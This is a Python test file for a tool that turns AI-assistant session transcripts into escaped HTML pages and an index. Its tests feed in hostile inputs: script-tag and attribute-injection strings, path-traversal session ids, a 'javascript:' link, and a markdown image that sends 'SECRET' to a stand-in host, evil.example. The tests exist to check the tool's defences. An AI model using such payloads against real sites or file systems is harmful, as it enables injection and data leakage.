import importlib.util
import json
import os
import sys
from pathlib import Path

HERE = Path(__file__).resolve().parent


def load(tmp_path):
    os.environ["REPLY_LEDGER_DIR"] = str(tmp_path / "replies")
    spec = importlib.util.spec_from_file_location("reply_ledger", HERE.parent / "scripts" / "reply_ledger.py")
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


def line(**kw):
    return json.dumps(kw) + "\n"


def transcript(path, lines):
    with open(path, "a") as fh:
        fh.writelines(lines)


def test_capture_keeps_prompts_and_reply_text_only(tmp_path):
    rl = load(tmp_path)
    t = tmp_path / "s.jsonl"
    transcript(t, [
        line(type="user", timestamp="2026-11-07T22:00:00Z", uuid="u1", message={"content": "do the thing <system-reminder>x</system-reminder>"}),
        line(type="assistant", timestamp="2026-11-07T22:00:05Z", uuid="a1", message={"id": "m1", "content": [{"type": "thinking", "thinking": "secret"}, {"type": "text", "text": "Working on it."}]}),
        line(type="assistant", timestamp="2026-11-07T22:00:06Z", uuid="a2", message={"id": "m1", "content": [{"type": "tool_use", "name": "Bash", "input": {}}]}),
        line(type="user", timestamp="2026-11-07T22:00:07Z", uuid="u2", message={"content": [{"type": "tool_result", "content": "out"}]}),
        line(type="user", timestamp="2026-11-07T22:00:08Z", uuid="u3", isMeta=True, message={"content": "meta"}),
        line(type="assistant", timestamp="2026-11-07T22:00:09Z", uuid="a3", isSidechain=True, message={"content": [{"type": "text", "text": "subagent"}]}),
        line(type="assistant", timestamp="2026-11-07T22:01:00Z", uuid="a4", message={"id": "m2", "content": [{"type": "text", "text": "**DONE:** the thing\n\n| a | b |\n|---|---|\n| 1 | 2 |"}]}),
        line(type="user", timestamp="2026-11-07T22:02:00Z", uuid="u4", message={"content": "<task-notification>\n<summary>Job x finished</summary></task-notification>"}),
    ])
    assert rl.run(t, "s", "/w") == 4
    recs = [json.loads(l) for l in (rl.OUT / "s.jsonl").read_text().splitlines()]
    assert [r["role"] for r in recs] == ["user", "assistant", "assistant", "event"]
    assert recs[0]["text"] == "do the thing"
    assert recs[3]["text"] == "Job x finished"
    page = (rl.OUT / "s.html").read_text()
    assert "<table>" in page and "secret" not in page and "subagent" not in page
    assert "Background event: Job x finished" in page
    assert (rl.OUT / "index.html").exists()


def test_incremental_and_partial_last_line(tmp_path):
    rl = load(tmp_path)
    t = tmp_path / "s.jsonl"
    transcript(t, [line(type="user", timestamp="2026-11-07T22:00:00Z", message={"content": "one"})])
    assert rl.run(t, "s", "") == 1
    with open(t, "a") as fh:  # a half-written line must wait for its newline
        fh.write('{"type": "assistant", "message": {"content": [{"type": "text", "text": "two"}]}')
    assert rl.run(t, "s", "") == 0
    with open(t, "a") as fh:
        fh.write("}\n")
    assert rl.run(t, "s", "") == 1
    assert rl.run(t, "s", "") == 0


def test_html_in_replies_is_escaped(tmp_path):
    rl = load(tmp_path)
    t = tmp_path / "s.jsonl"
    transcript(t, [line(type="user", timestamp="2026-11-07T22:00:00Z", message={"content": "<b>hi</b>"}),
                   line(type="assistant", timestamp="2026-11-07T22:00:01Z", message={"content": [{"type": "text", "text": "a <script>alert(1)</script> b"}]})])
    rl.run(t, "s", "")
    page = (rl.OUT / "s.html").read_text()
    assert "<script>alert(1)" not in page and "&lt;script&gt;" in page


def one_reply(tmp_path):
    t = tmp_path / "s.jsonl"
    transcript(t, [line(type="user", timestamp="2026-11-07T22:00:00Z", message={"content": "hi"}),
                   line(type="assistant", timestamp="2026-11-07T22:00:01Z", message={"content": [{"type": "text", "text": "yo"}]})])
    return t


def test_unsafe_session_ids_are_refused_before_any_path_is_built(tmp_path):
    import pytest
    rl = load(tmp_path)
    t = one_reply(tmp_path)
    before = {p for p in tmp_path.rglob("*")}
    for sid in ["../x", "../../x", "a/b", "/abs/x", "..", ".hidden", "", "a\x00b", "x" * 200, "a b", "<img src=x>"]:
        with pytest.raises(ValueError):
            rl.run(t, sid, "")
        with pytest.raises(ValueError):
            rl.render_session(sid)
    assert {p for p in tmp_path.rglob("*")} == before  # nothing created, inside or outside the folder
    assert not (tmp_path / "x.jsonl").exists() and not (tmp_path / "x.html").exists()
    assert rl.run(t, "0b1c2d3e-4f50-6789-abcd-ef0123456789", "") == 2  # a real session id still works


def test_hostile_session_via_the_command_line_is_logged_not_fatal(tmp_path, monkeypatch):
    rl = load(tmp_path)
    t = one_reply(tmp_path)
    monkeypatch.setattr(sys, "argv", ["reply_ledger.py", "--transcript", str(t), "--session", "../escape"])
    assert rl.main() == 0
    assert "unsafe session id" in (rl.STATE / "errors.log").read_text()
    assert not (tmp_path / "escape.jsonl").exists() and not (tmp_path / "escape.html").exists()


def test_odd_file_names_in_the_replies_folder_stay_out_of_the_index(tmp_path):
    rl = load(tmp_path)
    t = one_reply(tmp_path)
    rl.run(t, "good", "")
    (rl.OUT / 'a"onmouseover="x.jsonl').write_text('{"role": "user", "text": "z", "ts": "2026-11-07T22:00:00Z"}\n')
    rl.render_index()
    index = (rl.OUT / "index.html").read_text()
    assert 'href="good.html"' in index and "onmouseover" not in index


def test_pages_block_remote_content_and_pin_their_own_script(tmp_path):
    import base64
    import hashlib
    import re
    rl = load(tmp_path)
    t = tmp_path / "s.jsonl"
    transcript(t, [line(type="user", timestamp="2026-11-07T22:00:00Z", message={"content": "hi"}),
                   line(type="assistant", timestamp="2026-11-07T22:00:01Z",
                        message={"content": [{"type": "text", "text": "![x](https://evil.example/p.png?q=SECRET) [l](javascript:alert(1))"}]})])
    rl.run(t, "s", "")
    page = (rl.OUT / "s.html").read_text()
    assert "default-src 'none'" in page and "img-src data:" in page
    assert f"script-src 'sha256-{rl.js_hash()}'" in page
    assert 'href="javascript:' not in page  # markdown-it refuses the scheme as well
    inline = re.search(r"<script>(.*?)</script>", page, re.S).group(1)
    assert base64.b64encode(hashlib.sha256(inline.encode()).digest()).decode() == rl.js_hash()
    index = (rl.OUT / "index.html").read_text()
    assert "default-src 'none'" in index and "script-src 'none'" in index


def test_hook_never_fails(tmp_path, monkeypatch):
    rl = load(tmp_path)
    monkeypatch.setattr(sys, "argv", ["reply_ledger.py", "--hook"])
    monkeypatch.setattr(sys, "stdin", __import__("io").StringIO("not json"))
    assert rl.main() == 0
    assert "Traceback" in (rl.STATE / "errors.log").read_text()
